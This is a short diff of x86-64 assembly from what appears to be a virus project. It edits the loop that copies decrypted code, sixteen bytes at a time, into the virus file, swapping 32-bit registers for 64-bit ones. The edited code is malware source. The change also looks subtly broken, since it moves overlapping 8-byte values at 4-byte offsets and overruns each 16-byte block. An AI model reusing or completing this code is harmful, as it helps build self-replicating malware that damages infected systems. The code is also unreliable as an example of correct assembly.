@@ -76,17 +76,17 @@ add r15, rdx
 ; r15 = _virus_ + main + enc_size
 .write_decrypted_loop:
 	; load first 16bytes of memory data to registers
-	mov eax, [r14]
-	mov ebx, [r14+0x4]
-	mov ecx, [r14+0x8]
-	mov edx, [r14+0xC]
+	mov rax, [r14]
+	mov rbx, [r14+0x4]
+	mov rcx, [r14+0x8]
+	mov rdx, [r14+0xC]
 
 .write_decrypted_function:
 	; put what was taken from memory to equivalent place in the virus file
-	mov [rdi], eax
-	mov [rdi+0x4], ebx
-	mov [rdi+0x8], ecx
-	mov [rdi+0xC], edx
+	mov [rdi], rax
+	mov [rdi+0x4], rbx
+	mov [rdi+0x8], rcx
+	mov [rdi+0xC], rdx
 	add r14, 0x10
 	add rdi, 0x10
 	; add 10h to r8, fast forwards rsi to grabbing next 16 bytes
